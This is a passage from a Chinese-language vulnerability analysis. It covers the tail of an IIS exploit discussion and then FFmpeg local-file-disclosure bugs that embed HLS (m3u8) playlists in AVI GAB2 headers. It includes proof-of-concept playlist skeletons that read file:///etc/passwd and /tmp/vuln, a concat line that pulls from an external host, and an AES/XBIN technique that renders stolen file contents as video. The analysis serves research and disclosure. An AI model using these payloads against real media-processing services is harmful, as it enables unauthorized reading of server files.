可以看到，发送payload之后，靶机执行了calc程序，进程由w2wp创建，用户组是NETWORK_SERVICE。
更多攻击实例可以参考NSA 的 Explodingcan工具。
#### 总结
从非技术层面分析，一款已经被时代淘汰的产品，仍然有如此大量的使用量，在第三方分析网站中，截止2017年11月27日，美国、中国、印度仍各疑似有9346、6766、1454例可供公开访问的IIS服务受影响（这些不包括未知数量不能直接从互联网访问的IIS服务）。
2015年停止更新、2016被捕获到野外利用、2017年3月公布攻击代码，4月被发现出现在NSA
攻击工具中，在迟迟等来的官方6月更新中，发现更新文件在2016年10月创建，种种现象表明，网络并不安全。
### FFmpeg 安全问题
2017年6月27日 hackerone
公开了一个关于FFmpeg本地文件泄漏的报告。该报告中描述为25日公开的另一个FFmpeg本地文件泄漏相关。该漏洞Emil Lerner和Pavel
Cheremushkin在今年的phdays conference中已经披露。
#### FFmpeg及漏洞相关背景
FFmpeg是一个非常强大且运用广泛的多媒体框架，可以解码，编码，转码，播放几乎所有格式的多媒体文件。其基本工作流程如下：
原始的封装视频 –> demux分离器对封装的视频资源进行分离 –> 得到音频资源和视频资源 –> 进行解码 –> 得到解压后的音频资源和视频资源 –>
进入filter进行编辑处理 –> 得到处理后的音频资源和视频资源 –> 对资源编码得到转码后的音频资源和视频资源 –> 进入mux混合器进行封装 –>
得到转码封装后的视频。
虽然FFmpeg非常强大，但是正因为它强大的格式适配能力，加之各种流媒体协议的多样性，有可能对FFmpeg产生意想不到的安全威胁。
一般流媒体协议分为两种，一种是通过HTTP渐进下载的(如HLS,flash渐进式)，另一种则是RTSP形式的实时流媒体协议。HLS是Apple提出并推广的，全称为HTTP
Live Streaming。它会把整个视频流分成多个小的，基于 HTTP
的文件来下载，每次下载一部分，并把视频流元数据存放于m3u8文件中。m3u8本身并不是视频文件，它只会指定应该播放的视频资源，而真正播放的视频资源是下载下来的ts文件，可以把m3u8理解为一个配置文件，配置文件中指定了ts为播放文件，一个简单的m3u8如下：
    #EXTM3U
    #EXT-X-MEDIA-SEQUENCE
    #EXT-X-TARGETDURATION
    #EXT-X-ALLOW-CACHE
    #EXT-X-ENDLIST
    #EXTINF
    redrain.ts        真正播放的视频资源
当然，这个视频资源也可以是一个远程资源：
    #EXTM3U
    #EXT-X-MEDIA-SEQUENCE
    #EXT-X-TARGETDURATION
    #EXT-X-ALLOW-CACHE
    #EXT-X-ENDLIST
    #EXTINF
    http://www.redrain.sb/test.mp4        远程资源
#### 漏洞细节
在上个月的phdays conference里，通过视频格式的一个trick bypass了厂商对SSRF的封堵。
在AVI视频中，有一个数据块可以定义字幕，叫做GAB2，位置于AVI
header中，有趣的是m3u8可以插入到avi文件中，且FFmpeg依旧会对有文件头#EXTM3U的AVi视频做HLS处理。
所以我们可以通过对含有GAB2 header的AVI视频中嵌入m3u8，bypass厂商对CVE-2016-1898的修复。
只需要将之前的PoC嵌入AVI中，依然可以读取到目标文件。
    [AVI header GAB2 header]
    #EXTM3U
    #EXT-X-TARGETDURATION:6
    #EXTINF:10.0,
    concat:http://rr.sb/poc/header.m3u8|file:///tmp/vuln
    #EXT-X-ENDLIST
    [AVI body footer]
Emil Lerner和Pavel
Cheremushkin在会议中其实披露了多个FFmpeg的漏洞，其中一个最为有意思的，也就是在hackerone公开报告中用到的漏洞，把读取到的文件内容输出到视频中，从而可以让文件读取可以在无网络环境的情况下利用。
利用思路如下：
同样将m3u8嵌入到带有GAB2的AVI视频中，对文件格式检查进行bypass。
因为之前说过，m3u8并不是真正的视频资源，所以如果要播放，必须还要在m3u8中嵌入一个可播放的视频资源，其中有一个古老的媒体格式XBin，这个媒体格式具备基本显示图片，文本的功能，体积非常小，最重要的是，这个媒体格式可编程，如果嵌入到m3u8中，将目标文件作为对象，用xbin绘制成为字符，就可以作为合法可播放的视频文件观看了，所以依次嵌套后，文件内容大致为：
    [AVI header]
    [GAB2 header]
    [m3u8 header]
    [XBIN header]
    目标文件
    [XBIN footer]
    [m3u8 footer]
    [AVI footer]
但FFmpeg检查了body中的非法字符串，所以无法使用data:对XBIN格式声明：
    #EXTM3U
    #EXT-X-MEDIA-SEQUENCE:1
    #EXTINF:1.0,
    data:
    #EXTINF:1.0,
    file:///etc/passwd
    #EXTINF:1.0,
    data:
    #EXT-X-ENDLIST
但是m3u8支持AES128的CBC模式加密，可以在 ** _#EXT-X-KEY_** 中进行设置，所以可以很简单加密m3u8的内容：
    …
    #EXTINF:1,
    #EXT-X-KEY:METHOD=AES-128, URI=/dev/zero, IV=
    #EXT-X-BYTERANGE: 16
    /dev/zero
    …
    = AES^-1 CONST(0x00…00) ⊕ = 
由于m3u8单次访问目标文件获取到的内容不完整，为了获得完整的文件内容，还需要控制 ** _#EXT-X-BYTERANGE_**
设置偏移量，然后重复这一部分。
最终，我们得到的文件应该是这样的：
    [AVI header]
    [GAB2 header]
    [m3u8 header]
    {loop}
    #EXT-X-KEY:METHOD=AES-128, URI=/dev/zero, IV=     声明m3u8的AES加密，将XBIN部分加密
    [XBIN header]     被加密
    目标文件
    [XBIN footer]    被加密
    {loop}
    [m3u8 footer]
    [AVI footer]
执行后，读取的目标文件内容成功输出在ffplay的播放器中：
### 总结